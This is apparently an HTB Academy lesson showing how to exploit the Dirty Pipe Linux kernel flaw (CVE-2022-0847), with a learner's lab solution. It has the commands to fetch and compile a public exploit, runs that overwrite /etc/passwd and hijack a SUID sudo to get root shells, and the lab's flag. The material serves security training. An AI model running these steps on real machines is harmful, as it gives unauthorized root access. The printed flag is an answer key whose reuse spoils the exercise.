A vulnerability in the Linux kernel, named [Dirty Pipe](https://dirtypipe.cm4all.com/) ([CVE-2022-0847](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2022-0847)), allows unauthorized writing to root user files on Linux. Technically, the vulnerability is similar to the [Dirty Cow](https://dirtycow.ninja/) vulnerability discovered in 2016. All kernels from version `5.8` to `5.17` are affected and vulnerable to this vulnerability.

In simple terms, this vulnerability allows a user to write to arbitrary files as long as he has read access to these files. It is also interesting to note that Android phones are also affected. Android apps run with user rights, so a malicious or compromised app could take over the phone.

This vulnerability is based on pipes. Pipes are a mechanism of unidirectional communication between processes that are particularly popular on Unix systems. For example, we could edit the `/etc/passwd` file and remove the password prompt for the root. This would allow us to log in with the `su` command without the password prompt.

To exploit this vulnerability, we need to download a [PoC](https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits) and compile it on the target system itself or a copy we have made.

#### Download Dirty Pipe Exploit

```shell-session
cry0l1t3@nix02:~$ git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cry0l1t3@nix02:~$ cd CVE-2022-0847-DirtyPipe-Exploits
cry0l1t3@nix02:~$ bash compile.sh
```

After compiling the code, we have two different exploits available. The first exploit version (`exploit-1`) modifies the `/etc/passwd` and gives us a prompt with root privileges. For this, we need to verify the kernel version and then execute the exploit.

#### Verify Kernel Version

```shell-session
cry0l1t3@nix02:~$ uname -r

5.13.0-46-generic
```

#### Exploitation

```shell-session
cry0l1t3@nix02:~$ ./exploit-1

Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell... (run commands now)

id

uid=0(root) gid=0(root) groups=0(root)
```

With the help of the 2nd exploit version (`exploit-2`), we can execute SUID binaries with root privileges. However, before we can do that, we first need to find these SUID binaries. For this, we can use the following command:

#### Find SUID Binaries

```shell-session
cry0l1t3@nix02:~$ find / -perm -4000 2>/dev/null

/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/sbin/pppd
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/passwd
/usr/bin/fusermount
/usr/bin/sudo
/usr/bin/vmware-user-suid-wrapper
/usr/bin/gpasswd
/usr/bin/mount
/usr/bin/pkexec
/usr/bin/newgrp
```

Then we can choose a binary and specify the full path of the binary as an argument for the exploit and execute it.

#### Exploitation

```shell-session
cry0l1t3@nix02:~$ ./exploit-2 /usr/bin/sudo

[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell.. (dont forget to clean up /tmp/sh ;))

# id

uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),120(lpadmin),131(lxd),132(sambashare),1000(cry0l1t3)
```






#### Questions

Escalate the privileges and submit the contents of flag.txt as the answer.

* Download the VPN file from the HTB Academy webpage
* Open your VM and go to your Downloads page from the terminal
* Run the command " openvpn academy-regular.ovpn " (if it doesnt work try running the same command with sudo)
* Use the user and password given by HTB and then SSH to the target system spawned for you by running this command "ssh htb-student@\<ip given>\"
* Run Command " find / -perm -4000 2>/dev/null " and you will see you have access to a lot of binaries, including sudo in " /snap/core18/2620/usr/bin/sudo " which we will abuse
* For this solution I used the CVE-2022-0847, and i used the exploit 2
* Copy the script in a file named " exploit-2.c " (or whatever name you wanna give it)
* Compile the code with the command " gcc exploit-2.c -o exploit-2 " 
* Run the command " ./exploit-2 /snap/core18/2620/usr/bin/sudo " to get access as root
* Go to the root folder and open the flag file
* HTB{D1rTy_DiR7Y}